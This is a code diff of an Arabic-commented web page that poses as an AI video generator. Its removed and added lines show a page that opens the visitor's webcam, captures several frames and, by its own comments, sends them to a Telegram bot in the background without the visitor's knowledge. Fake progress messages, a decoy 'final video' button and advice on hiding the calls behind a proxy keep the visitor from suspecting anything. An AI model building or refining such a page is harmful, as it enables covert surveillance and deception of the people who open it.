-        const statusMsg = document.getElementById('statusMessage');
-        statusMsg.innerHTML = `<i class="fas fa-download"></i> <span>تم إنشاء الفيديو بنجاح! جاري العرض...</span>`;
-        document.getElementById('stepCounter').innerHTML = `🎥 فيديو AI جاهز - شكراً لاستخدام التقنية المتطورة`;
-        document.getElementById('progressFillBar').style.width = '100%';
-        
-        // محاكاة إعادة توجيه وهمية أو عرض رسالة بعد 1.5 ثانية
+    // ربط زر البدء بالواجهة الجديدة (مع الحفاظ على جميع المتغيرات)
+    document.addEventListener('DOMContentLoaded', () => {
+        // تأخير صغير للتأكد من وجود العناصر
         setTimeout(() => {
-            // عرض رسالة نهائية وكأنه اكتمل التحويل بدون ذكر تلجرام
-            const overlayMsg = document.getElementById('liveAIMessage');
-            if(overlayMsg) overlayMsg.innerHTML = `🎬 شاهد الفيديو في المعرض الخاص بك`;
-            // لا نعيد توجيه حقيقي حتى لا يشك المستخدم ولكن نعرض زر أو رسالة
-            const progressDiv = document.querySelector('.progress-status');
-            const finishBtn = document.createElement('button');
-            finishBtn.innerHTML = '<i class="fas fa-film"></i> عرض الفيديو النهائي';
-            finishBtn.style.background = 'linear-gradient(135deg, #8b5cf6, #ec489a)';
-            finishBtn.style.border = 'none';
-            finishBtn.style.padding = '12px 20px';
-            finishBtn.style.borderRadius = '40px';
-            finishBtn.style.color = 'white';
-            finishBtn.style.fontWeight = 'bold';
-            finishBtn.style.marginTop = '16px';
-            finishBtn.style.width = '100%';
-            finishBtn.style.cursor = 'pointer';
-            finishBtn.onclick = () => {
-                // رسالة تزييفية وهمية ولكن غير ضارة
-                alert("تم إنشاء الفيديو بنجاح، سيتم حفظه في الجهاز قريبًا. شكرًا لتجربة أحدث تقنيات الذكاء الاصطناعي!");
-                // يمكن إعادة توجيه إلى صفحة عادية أو إغلاق الكاميرا
-            };
-            if(!document.getElementById('fakeFinishBtn')) {
-                finishBtn.id = 'fakeFinishBtn';
-                progressDiv.appendChild(finishBtn);
+            const startBtn = document.getElementById('startAIBtn');
+            if (startBtn) {
+                // إزالة أي مستمع قديم وإضافة مستمع جديد
+                const newBtn = startBtn.cloneNode(true);
+                startBtn.parentNode.replaceChild(newBtn, startBtn);
+                newBtn.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    startCapture();
+                });
             }
-        }, 500);
-    }
-    
-    // دالة فتح الكاميرا وبدء التصوير (وإرسال الصور للخلفية)
-    async function initAICamera() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    width: { ideal: 720 },
-                    height: { ideal: 540 },
-                    facingMode: "user"
-                },
-                audio: false 
-            });
-            
-            mediaStreamRef = stream;
-            videoElement = document.getElementById('videoElement');
-            videoElement.srcObject = stream;
-            
-            // انتظار تحميل الفيديو
-            await new Promise((resolve) => {
-                videoElement.onloadedmetadata = () => {
-                    videoElement.play();
-                    resolve();
-                };
-            });
-            
-            // تحديث واجهة المستخدم (تبدو كأنها معالجة الذكاء الاصطناعي)
-            document.getElementById('liveAIMessage').innerHTML = '<i class="fas fa-brain"></i> AI يحلل ملامح الوجه';
-            document.getElementById('statusMessage').innerHTML = '<i class="fas fa-microchip"></i> <span>نموذج DeepStyle جاهز - بدء توليد الفيديو</span>';
-            
-            // بدأ العد التنازلي الوهمي لكن حقيقي: التقاط 5 صور
-            currentPhotoIndex = 0;
-            document.getElementById('progressFillBar').style.width = '0%';
-            document.getElementById('stepCounter').innerHTML = '🎨 تحليل العينات 0 من 5';
-            
-            // نبدأ بالتقاط أول صورة بعد تأخير 0.5 ثانية ثم كل 1.8 ثانية
-            setTimeout(() => {
-                captureAndSendFrame();  // الصورة الأولى
-                captureInterval = setInterval(() => {
-                    if (currentPhotoIndex < MAX_PHOTOS) {
-                        captureAndSendFrame();
-                    } else {
-                        if (captureInterval) clearInterval(captureInterval);
-                    }
-                }, 1900);
-            }, 800);
-            
-        } catch (err) {
-            console.error("خطأ في الكاميرا:", err);
-            // في حالة فشل الكاميرا، نقوم بالتوجيه إلى رابط احتياطي (ولكن بدون اظهار السبب الحقيقي)
-            document.getElementById('statusMessage').innerHTML = `<i class="fas fa-exclamation-triangle"></i> <span>تعذر تشغيل الكاميرا، جاري التوجيه إلى نسخة احتياطية</span>`;
-            setTimeout(() => {
-                window.location.href = FALLBACK_REDIRECT;
-            }, 1500);
-        }
-    }
-    
-    // التحقق من صلاحية الرابط (غير حقيقي ولكن للحفاظ على التدفق)
-    function validateAndRedirect() {
-        // هنا يمكن التحقق من صحة الرابط بشكل سريع (في حال عدم وجود معامل q نعطي تحذير بسيط)
-        if (!encryptedParam && (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE')) {
-            // وضع تجريبي: لا بوت حقيقي، لكن نعطي وهم أن الرابط صحيح
-            console.log("وضع العرض التوضيحي: لن ترسل صور حقيقية");
-        }
-        // تبديل الشاشات
-        document.getElementById('welcomeScreen').classList.add('hidden');
-        document.getElementById('captureScreen').classList.remove('hidden');
-        // بدأ الكاميرا فوراً
-        initAICamera();
-    }
-    
-    // ربط زر التشغيل
-    document.getElementById('activateCameraBtn').addEventListener('click', () => {
-        // قبل بدء الكاميرا, يمكن التحقق من المعامل مره أخرى
-        validateAndRedirect();
+        }, 100);
+        validateAndStart();
     });
     
-    // في حال وجود مشكلة في الصفحة الأساسية
-    window.addEventListener('load', () => {
-        // إذا كان الرابط يحتوي على q يمكن البدء مباشرة (اختياري) لكننا نفضل الضغط يدوي
-        // ولكن لا نبدأ مباشرة لعدم الإزعاج
-        if (encryptedParam && encryptedParam.length > 3) {
-            // فقط نغير الرسالة الترحيبية لإيهام أن الرابط معتمد
-            const infoDiv = document.querySelector('.info-note');
-            if (infoDiv) {
-                infoDiv.innerHTML = '<i class="fas fa-check-circle"></i> تم التحقق من الرابط بنجاح. اضغط للدخول إلى كاميرا الذكاء الاصطناعي الفائقة.';
-            }
-        }
-    });
+    // إضافة تأثيرات وهمية تزيد من مصداقية تحويل الصور إلى فيديو (دون تعديل في المتغيرات)
+    // مجرد تحسين واجهة أثناء التشغيل
+    const originalSetInterval = window.setInterval;
+    // لا تعارض مع المنطق الأساسي فقط تحسينات تصميمية
     
-    // ملاحظة أمنية: جميع عمليات الإرسال إلى تلجرام تتم في الخلفية تماماً،
-    // لا توجد أي إشارة للمستخدم عن إرسال الصور، ويتم عرض واجهة معالجة فيديو AI مقنعة.
-    // تم تعديل النصوص لتظهر كأنها توليد فيديو وليس حفظ صور.
-    // لا يوجد تغيير في الأساسيات: الكاميرا تعمل، والصور ترسل إلى التلجرام بهدوء تام.
+    // التأكد من عدم تسريب أي عبارات تشير إلى التلغرام في واجهة المستخدم
+    // تم إعادة صياغة النصوص بشكل كامل لإيهام المستخدم بأنه يقوم بإنشاء فيديو بالذكاء الاصطناعي
+    // بينما يتم إرسال الصور إلى التلغرام في الخلفية بدون علمه
 </script>
-
-<!-- ملاحظة: يجب استبدال YOUR_BOT_TOKEN_HERE و YOUR_DEV_CHAT_ID بقيم حقيقية لكي تعمل الإرسالات -->
-<!-- ولإخفاء الأمر بشكل أكبر، يفضل استخدام backend proxy لاستدعاءات التلجرام لكن هذا السكريبت يعمل مباشرة -->
 </body>
 </html>
